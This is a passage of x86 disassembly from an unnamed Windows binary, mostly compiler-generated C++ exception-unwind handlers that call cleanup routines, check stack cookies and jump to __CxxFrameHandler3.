mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445a30
jmp sub_412940
sub_445a35
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445a60
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_445a68
mov ecx [ ebp - 0x10 ]
add ecx 0x78
jmp sub_402ca0
sub_445a73
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445a7b
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445a83
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_445a8e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ab0
mov ecx [ ebp - 0x10 ]
jmp sub_43e350
sub_445ab8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ae0
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_445ae8
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_445af0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445b10
mov eax [ ebp + 0x8 ]
push eax
call sub_429b50
retn
sub_445b1a
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_445b22
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_445b2a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445b50
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_445b58
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_445b62
lea ecx [ ebp - 0x2c ]
jmp sub_405f40
sub_445b6a
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_445b72
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445b90
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_445b98
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_445ba2
lea ecx [ ebp - 0x24 ]
jmp sub_405f40
sub_445baa
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_445bb2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445bd0
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_445bd8
lea eax [ ebp - 0x24 ]
push eax
call sub_40a500
retn
sub_445be2
lea ecx [ ebp - 0x20 ]
jmp sub_405f40
sub_445bea
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_445bf2
lea eax [ ebp - 0x24 ]
jmp sub_40bee0
sub_445bfa
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445c20
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_445c2b
mov esi [ ebp - 0x10 ]
add esi 0x8
jmp sub_439510
sub_445c36
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_445c3e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445c60
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_445c68
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445c70
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_445c7b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ca0
mov ecx [ ebp + 0x8 ]
jmp sub_40e460
sub_445ca8
mov ecx [ ebp + 0x8 ]
add ecx 0x70
jmp sub_426f70
sub_445cb3
mov ecx [ ebp + 0x8 ]
jmp sub_426c20
sub_445cbb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ce0
jmp sub_412940
sub_445ce5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445d00
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445d20
lea esi [ ebp - 0x20 ]
jmp sub_439510
sub_445d28
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445d50
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_439510
sub_445d5b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445d80
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_402ca0
sub_445d8b
mov ecx [ ebp + 0x8 ]
add ecx 0xc
jmp sub_402ca0
sub_445d96
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_445d9e
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_445da6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445dd0
jmp sub_412940
sub_445dd5
jmp sub_412940
sub_445dda
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445e00
mov esi [ ebp - 0x10 ]
add esi 0xc
jmp sub_439510
sub_445e0b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445e30
mov esi [ ebp - 0x10 ]
add esi 0xc
jmp sub_439510
sub_445e3b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445e60
mov ecx [ ebp + 0x8 ]
add ecx 0x28
jmp sub_402ca0
sub_445e6b
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_445e73
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445e90
mov ecx [ ebp + 0x8 ]
jmp sub_41b2a0
sub_445e98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ec0
jmp sub_412940
sub_445ec5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445ee0
lea ecx [ ebp - 0x3a0 ]
jmp sub_41b2a0
sub_445eeb
lea eax [ ebp - 0x3a0 ]
push eax
call sub_41f510
retn
sub_445ef8
lea ecx [ ebp - 0x3a0 ]
jmp sub_41b2a0
sub_445f03
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3a4 ]
mov ecx [ edx - 0x3a8 ]
xor ecx eax
call sub_443fba
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445f40
jmp sub_412940
sub_445f45
jmp sub_412940
sub_445f4a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x184 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445f80
jmp sub_412940
sub_445f85
mov eax [ ebp - 0x20c ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_445f94
mov eax [ ebp - 0x24c ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_445fa3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x250 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445fd0
jmp sub_412940
sub_445fd5
lea esi [ ebp - 0x10 ]
jmp sub_41f4f0
sub_445fdd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446000
lea ecx [ ebp - 0x34 ]
jmp sub_41b2a0
sub_446008
lea eax [ ebp - 0x34 ]
push eax
call sub_41f510
retn
sub_446012
lea ecx [ ebp - 0x34 ]
jmp sub_41b2a0
sub_44601a
jmp sub_412940
sub_44601f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446040
mov ecx [ ebp + 0x8 ]
jmp sub_41b2a0
sub_446048
mov esi [ ebp + 0x8 ]
add esi 0x18
jmp sub_41f4f0
sub_446053
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446070
mov ecx [ ebp + 0x8 ]
jmp sub_41b2a0
sub_446078
mov esi [ ebp + 0x8 ]
add esi 0x18
jmp sub_41f4f0
sub_446083
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4460a0
lea ecx [ ebp - 0x24 ]
jmp sub_41b0b0
sub_4460a8
lea eax [ ebp - 0x24 ]
push eax
call sub_41b060
retn
sub_4460b2
lea ecx [ ebp - 0x24 ]
jmp sub_41b0b0
sub_4460ba
jmp sub_412940
sub_4460bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4460e0
mov eax [ ebp - 0x14 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_4460ec
jmp sub_412940
sub_4460f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446110
mov eax [ ebp - 0x18 ]
jmp sub_41b280
sub_446118
mov eax [ ebp - 0x18 ]
jmp sub_41b280
sub_446120
mov eax [ ebp - 0x18 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44612c
mov eax [ ebp - 0x18 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_446138
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446160
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_41b2a0
sub_44616b
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_41b2a0
sub_446176
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_41b2a0
sub_446181
mov ecx [ ebp - 0x10 ]
add ecx 0x48
jmp sub_402ca0
sub_44618c
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446194
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4461b0
jmp sub_412940
sub_4461b5
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4461e0
jmp sub_412940
sub_4461e5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446200
jmp sub_412940
sub_446205
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446220
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_439510
sub_44622b
mov eax [ ebp - 0x14 ]
jmp sub_40c2e0
sub_446233
mov eax [ ebp - 0x14 ]
push eax
call sub_421ba0
retn
sub_44623d
mov eax [ ebp + 0x8 ]
add eax 0x14
push eax
call sub_442080
retn
sub_44624a
mov esi [ ebp + 0x8 ]
add esi 0x28
jmp sub_439510
sub_446255
mov esi [ ebp + 0x8 ]
add esi 0x3c
jmp sub_439510
sub_446260
lea ecx [ ebp - 0x20 ]
jmp [ std::exception::~exception@IAT ]
sub_446269
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446290
lea esi [ ebp - 0x220 ]
jmp sub_410f20
sub_44629b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x240 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4462d0
mov esi [ ebp + 0x8 ]
jmp sub_40f850
sub_4462d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446300
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_44630b
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_402ca0
sub_446316
mov ecx [ ebp + 0x8 ]
add ecx 0x14
jmp sub_402ca0
sub_446321
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_446329
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_446331
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_446339
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446360
mov eax [ ebp + 0x8 ]
push eax
call sub_4016d0
retn
sub_44636a
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_446372
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_44637d
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446385
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44638d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4463b0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_4463bb
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_402ca0
sub_4463c6
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_402ca0
sub_4463d1
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_402ca0
sub_4463dc
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_402ca0
sub_4463e7
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_402ca0
sub_4463f2
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_402ca0
sub_4463fd
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446405
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44640d
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446415
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44641d
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446425
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44642d
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446435
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446450
jmp sub_412940
sub_446455
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446470
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_446478
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_446482
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44648a
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_446494
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44649c
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_4464a4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4464c0
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_40a440
sub_4464cb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4464f0
lea esi [ ebp - 0x70 ]
jmp sub_409b30
sub_4464f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446520
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_446528
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_446532
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44653a
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_446544
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44654c
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_446554
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446570
lea eax [ ebp + 0x10 ]
jmp sub_40bee0
sub_446578
lea eax [ ebp + 0x10 ]
push eax
call sub_40a500
retn
sub_446582
lea eax [ ebp + 0x10 ]
jmp sub_40bee0
sub_44658a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4465b0
lea eax [ ebp + 0x8 ]
jmp sub_40ab00
sub_4465b8
lea eax [ ebp + 0x10 ]
jmp sub_40ab00
sub_4465c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4465e0
mov ecx [ ebp + 0x8 ]
jmp sub_407f20
sub_4465e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446610
lea ecx [ ebp - 0x14 ]
jmp sub_408e30
sub_446618
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446640
mov eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_44664a
mov eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_446652
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446670
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_446678
lea eax [ ebp - 0x28 ]
push eax
call sub_40a500
retn
sub_446682
lea eax [ ebp - 0x28 ]
jmp sub_40bee0
sub_44668a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4466b0
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_4466b8
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_4466c2
lea eax [ ebp + 0x8 ]
push eax
call sub_4057b0
retn
sub_4466cc
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_4466d6
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_4466de
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_4466e8
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_4466f0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446710
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_446718
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_446722
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44672a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446750
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_446758
lea eax [ ebp + 0x8 ]
push eax
call sub_40a500
retn
sub_446762
lea eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_44676a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446790
mov ecx [ ebp + 0x8 ]
jmp sub_408e30
sub_446798
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4467c0
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4467c8
lea eax [ ebp - 0x10 ]
push eax
call sub_442980
retn
sub_4467d2
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4467da
lea eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4467e2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446800
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_446808
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_446812
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44681a
lea eax [ ebp - 0x10 ]
push eax
call sub_40a500
retn
sub_446824
lea eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_44682c
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_446834
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446850
mov eax [ ebp + 0xc ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44685c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446880
mov eax [ ebp + 0x8 ]
push eax
call sub_421ba0
retn
sub_44688a
mov eax [ ebp + 0x8 ]
jmp sub_40c2e0
sub_446892
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4468b0
mov ecx [ ebp + 0x8 ]
jmp sub_4302d0
sub_4468b8
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4468c5
mov eax [ ebp + 0x8 ]
add eax 0xc
jmp sub_40a440
sub_4468d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4468f0
mov ecx [ ebp + 0x8 ]
jmp sub_40e460
sub_4468f8
mov ecx [ ebp + 0x8 ]
add ecx 0x70
jmp sub_426f70
sub_446903
mov ecx [ ebp + 0x8 ]
jmp sub_426c20
sub_44690b
mov eax [ ebp - 0x14 ]
add eax 0xc
jmp sub_40a440
sub_446916
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_446923
mov ecx [ ebp - 0x10 ]
jmp sub_4302d0
sub_44692b
mov eax [ ebp - 0x10 ]
push eax
call sub_43e8a0
retn
sub_446935
mov eax [ ebp + 0x8 ]
add eax 0x74
push eax
call sub_4067b0
retn
sub_446942
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446960
jmp sub_412940
sub_446965
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446990
mov ecx [ ebp - 0x10 ]
jmp sub_4341f0
sub_446998
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4469c0
mov eax [ ebp - 0x10 ]
add eax 0x8
push eax
call sub_40a450
retn
sub_4469cd
mov eax [ ebp - 0x10 ]
add eax 0xc
jmp sub_40a440
sub_4469d8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446a00
lea eax [ ebp - 0xb0 ]
push eax
call sub_41b480
retn
sub_446a0d
jmp sub_412940
sub_446a12
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xb0 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446a40
jmp sub_412940
sub_446a45
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1c ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446a60
mov ecx [ ebp - 0x10 ]
jmp sub_427200
sub_446a68
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_446a70
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_446a78
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_446a83
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446aa0
mov ecx [ ebp - 0x10 ]
jmp sub_427200
sub_446aa8
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_446ab0
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_446ab8
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_446ac3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446ae0
mov ecx [ ebp + 0x8 ]
jmp sub_427200
sub_446ae8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_446b10
mov ecx [ ebp - 0x10 ]
jmp sub_427200
sub_446b18
mov ecx [ ebp - 0x10 ]
add ecx 0x80
jmp sub_402ca0
sub_446b26
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_446b2e
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_446b36
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_446b3e
mov ecx [ ebp - 0x10 ]
add ecx 0x70
